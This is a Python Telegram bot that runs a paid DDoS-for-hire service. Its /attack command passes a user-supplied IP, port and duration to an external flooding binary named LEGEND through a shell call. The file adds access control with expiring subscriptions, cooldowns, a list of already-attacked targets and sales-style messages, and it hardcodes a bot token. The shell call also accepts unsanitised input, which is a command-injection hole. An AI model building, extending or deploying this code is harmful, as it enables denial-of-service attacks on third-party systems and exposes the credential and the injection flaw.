import os
import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7978273546:AAF61pQ5Vjgm_LeXXzdpchTnfeMJO0tmRJU'
ADMIN_USER_ID = 8079078255
bot_access_free = True

# Store attacked IPs to prevent duplicate attacks
attacked_ips = set()

# Default maximum allowed attack duration (in seconds)
MAX_ATTACK_DURATION = 240

# Cooldown period (in seconds) after an attack is initiated
COOLDOWN_PERIOD = 100

# Dictionary to store allowed users and their expiry timestamp.
# If expiry is None, then access never expires.
allowed_users = {ADMIN_USER_ID: None}

# Dictionary to store last attack timestamp for each user
user_last_attack = {}

def is_user_allowed(user_id: int) -> bool:
    """
    Check if user_id is allowed based on allowed_users dictionary.
    If an expiry timestamp is set, ensure it is not passed.
    """
    if user_id in allowed_users:
        expiry = allowed_users[user_id]
        # If expiry is None, access never expires.
        if expiry is None or time.time() < expiry:
            return True
    return False

def is_on_cooldown(user_id: int) -> bool:
    """
    Check if user is in cooldown period after an attack.
    """
    last_attack = user_last_attack.get(user_id, 0)
    return (time.time() - last_attack) < COOLDOWN_PERIOD

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "🌟 **Welcome to the Elite Battlefield!** 🌟\n\n"
        "Experience our cutting-edge service.\n\n"
        "👉 Use `/attack <ip> <port> <duration>` to initiate your premium assault.\n"
        "🚀 Let the premium war begin!"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❗ **Error during premium attack:** {str(e)}", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="✅ **Premium Attack Completed!**\nThank you for trusting our elite service.", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** You are not authorized to use this premium service.", parse_mode='Markdown')
        return

    if is_on_cooldown(user_id):
        remaining = int(COOLDOWN_PERIOD - (time.time() - user_last_attack[user_id]))
        await context.bot.send_message(chat_id=chat_id, text=f"⏳ **Cooldown Active!** Please wait {remaining} seconds before launching another attack.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/attack <ip> <port> <duration>`", parse_mode='Markdown')
        return

    ip, port, duration_str = args

    try:
        duration = int(duration_str)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid duration!** Please enter a valid number for duration.", parse_mode='Markdown')
        return

    if duration > MAX_ATTACK_DURATION:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **Maximum allowed duration is {MAX_ATTACK_DURATION} seconds!** Please enter a duration up to {MAX_ATTACK_DURATION} seconds.", parse_mode='Markdown')
        return

    if ip in attacked_ips:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **Notice:** The IP `{ip}` has already been targeted. Please choose another premium target.", parse_mode='Markdown')
        return

    # Record the attack time for cooldown purposes
    user_last_attack[user_id] = time.time()
    attacked_ips.add(ip)  # Store attacked IP

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"🔥 **Premium Attack Initiated!** 🔥\n"
        f"**Target:** `{ip}:{port}`\n"
        f"**Duration:** `{duration}` seconds\n\n"
        f"Sit back and enjoy our elite service!"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def set_max_time(update: Update, context: CallbackContext):
    global MAX_ATTACK_DURATION
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can change the maximum attack duration.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/setmaxtime <seconds>`", parse_mode='Markdown')
        return

    try:
        new_limit = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid value!** Please enter a valid number for seconds.", parse_mode='Markdown')
        return

    MAX_ATTACK_DURATION = new_limit
    await context.bot.send_message(chat_id=chat_id, text=f"✅ **Maximum attack duration updated to {MAX_ATTACK_DURATION} seconds.**", parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    """
    /add <user_id> <expiry_value> <unit>
    Unit can be one of: seconds, minutes, days
    If expiry_value is <= 0, access is permanent.
    Example: /add 123456789 10 minutes
    """
    chat_id = update.effective_chat.id
    user_id_sender = update.effective_user.id

    if user_id_sender != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can add users.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/add <user_id> <expiry_value> <unit>`\nUnit can be 'seconds', 'minutes' or 'days'.", parse_mode='Markdown')
        return

    try:
        new_user_id = int(args[0])
        expiry_value = int(args[1])
        unit = args[2].lower()
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid input!** Please ensure user_id and expiry_value are numbers.", parse_mode='Markdown')
        return

    # Calculate expiry timestamp based on unit
    if expiry_value <= 0:
        expiry_timestamp = None
    else:
        if unit in ['second', 'seconds']:
            multiplier = 1
        elif unit in ['minute', 'minutes']:
            multiplier = 60
        elif unit in ['day', 'days']:
            multiplier = 86400
        else:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid unit!** Please use 'seconds', 'minutes' or 'days'.", parse_mode='Markdown')
            return
        expiry_timestamp = time.time() + (expiry_value * multiplier)

    allowed_users[new_user_id] = expiry_timestamp

    if expiry_timestamp:
        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {new_user_id} added with expiry in {expiry_value} {unit}.**", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {new_user_id} added with permanent access.**", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    """
    /remove <user_id>
    Admin command to remove a user from allowed_users.
    """
    chat_id = update.effective_chat.id
    user_id_sender = update.effective_user.id

    if user_id_sender != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can remove users.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/remove <user_id>`", parse_mode='Markdown')
        return

    try:
        remove_id = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid user_id!** Please enter a valid number.", parse_mode='Markdown')
        return

    if remove_id in allowed_users:
        del allowed_users[remove_id]
        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {remove_id} has been removed from allowed users.**", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **User {remove_id} is not in the allowed users list.**", parse_mode='Markdown')

async def list_users(update: Update, context: CallbackContext):
    """
    /users
    Lists all allowed users along with their expiry details.
    """
    chat_id = update.effective_chat.id
    if not allowed_users:
        await context.bot.send_message(chat_id=chat_id, text="ℹ️ **No users are currently allowed.**", parse_mode='Markdown')
        return

    message_lines = ["📋 **Allowed Users:**"]
    current_time = time.time()
    for uid, expiry in allowed_users.items():
        if expiry is None:
            expiry_str = "Permanent"
        else:
            remaining = int(expiry - current_time)
            expiry_str = f"{remaining} seconds remaining" if remaining > 0 else "Expired"
        message_lines.append(f"- `{uid}`: {expiry_str}")

    message = "\n".join(message_lines)
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """
    /help
    Show available commands.
    - Admin sees all commands.
    - Allowed users see commands based on their access.
    """
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id == ADMIN_USER_ID:
        help_message = (
            "🛠 **Admin Commands:**\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack\n"
            "/setmaxtime <seconds> - Set max attack duration\n"
            "/add <user_id> <expiry_value> <unit> - Add a user (unit: seconds, minutes, days)\n"
            "/remove <user_id> - Remove a user\n"
            "/users - List allowed users\n"
            "/help - Show this help message\n"
        )
    else:
        # For allowed users, only show the commands they have access to.
        help_message = (
            "🛠 **User Commands:**\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack\n"
            "/users - List allowed users\n"
            "/help - Show this help message\n"
        )
    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("setmaxtime", set_max_time))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))

    application.run_polling()

if __name__ == '__main__':
    main()

